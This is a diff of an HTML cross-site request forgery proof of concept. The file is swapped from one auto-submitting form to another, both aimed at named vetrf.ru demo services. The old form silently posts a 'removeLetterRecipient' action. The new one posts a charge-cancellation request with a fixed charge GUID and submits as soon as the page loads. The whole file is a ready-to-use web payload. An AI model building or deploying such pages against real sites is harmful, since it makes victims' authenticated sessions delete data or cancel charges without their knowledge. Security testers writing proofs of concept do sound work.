@@ -1,23 +1,17 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>CSRF PoC - removeLetterRecipient</title>
+  <meta charset="utf-8">
+  <title>CSRF PoC</title>
 </head>
 <body>
-    <form id="csrf-form" action="https://demo-duma.vetrf.ru/operatorui" method="POST" style="display:none;">
-        <input type="hidden" name="pageList" value="1" />
-        <input type="hidden" name="pageList" value="1" />
-        <input type="hidden" name="rows" value="10" />
-        <input type="hidden" name="_action" value="removeLetterRecipient" />
-        <input type="hidden" name="cancelUrl" value="operatorui?action=listLetterRecipient" />
-        <input type="hidden" name="pk" value="120" />
-        <input type="hidden" name="version" value="0" />
-    </form>
-    <script>
-        window.onload = function() {
-            document.getElementById('csrf-form').submit();
-        };
-    </script>
+  <form id="csrfForm" action="https://demo-cerberus2.vetrf.ru/cerberus/uin/cancel" method="POST">
+    <input type="hidden" name="chargeGuid" value="4b24e41f-ce82-e73f-8e2d-a7b6174b51af">
+    <input type="hidden" name="cancellationReason" value="test">
+  </form>
+
+  <script>
+    document.getElementById('csrfForm').submit();
+  </script>
 </body>
 </html>
